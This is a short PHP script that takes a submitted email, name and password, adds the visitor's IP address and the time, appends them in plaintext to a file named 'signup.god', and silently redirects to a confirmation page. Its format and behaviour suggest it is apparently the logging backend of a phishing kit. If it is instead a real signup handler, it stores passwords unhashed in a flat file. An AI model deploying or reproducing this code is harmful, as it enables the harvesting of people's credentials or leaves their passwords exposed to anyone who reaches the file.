<?php
$mail = $_POST['email'];
$name = $_POST['name'];
$pass = $_POST['password'];
$today = date("H:i:s Y/m/d");
$ip=$_SERVER['REMOTE_ADDR'];

$info="Email: $mail || Password: $pass || Name: $name || IP: $ip || Time = $today\r\n";
$fh=fopen('signup.god', "a+");
fwrite($fh, $info);
fclose($fh);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/confirm'></head></html>";
?>